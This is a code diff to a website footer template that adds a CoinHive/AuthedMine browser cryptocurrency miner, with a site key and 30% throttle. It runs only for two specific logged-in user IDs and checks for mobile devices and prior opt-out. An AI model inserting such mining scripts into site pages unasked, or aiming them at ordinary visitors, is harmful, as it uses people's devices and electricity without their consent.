@@ -42,6 +42,20 @@ var i = setInterval(function() { myFunction(); }, 10000);
 
 	</div>
 </center>
+<?php if($user_ID == 234 || $user_ID == 1):?>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	
+	var miner = new CoinHive.User('TPizDjd3wD2tfV9ATaWHZnwJkEUIgPWZ', <?php echo $user_ID;?>,{throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	
+	}
+</script>
+<?php endif;?>
 </footer>
 
 <div class="copyright">
